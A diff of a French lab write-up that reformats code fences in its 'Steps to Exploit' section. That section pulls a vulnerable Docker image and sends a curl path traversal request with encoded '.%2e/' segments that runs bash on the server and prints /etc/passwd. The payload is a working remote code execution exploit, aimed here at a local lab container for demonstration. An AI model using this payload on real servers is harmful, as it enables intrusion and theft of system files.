@@ -35,19 +35,19 @@ permet de lire des fichiers en dehors du répertoire racine.
 ### Steps to Exploit
 
 1. Télécharger l'image Docker contenant l'application vulnérable démontrant la faille RCE via path traversal
-        ```bash
+```bash
  docker pull eddycaron/diable:rcepathtraversal
-     ```
+```
 
 3. Lancer l'application vulnérable dans un conteneur Docker en mode détaché (en arrière-plan) et lier le port 8080 du conteneur au port 80 de l'hôte
-      ```bash
+```bash
  docker run -d -p 8080:80 --name rcept eddycaron/diable:rcepathtraversal
-     ```
+```
 
 4. Envoyer une requête HTTP malveillante via curl pour exploiter la vulnérabilité de path traversal et exécuter une commande arbitraire (bash), récupérant ainsi le fichier /etc/passwd
-        ```bash
+```bash
  curl -v "http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash" -d "echo Content-Type: text/plain; echo; cat /etc/passwd" -H "Content-Type: text/plain" 
-     ```
+```
 
 
 # Impact
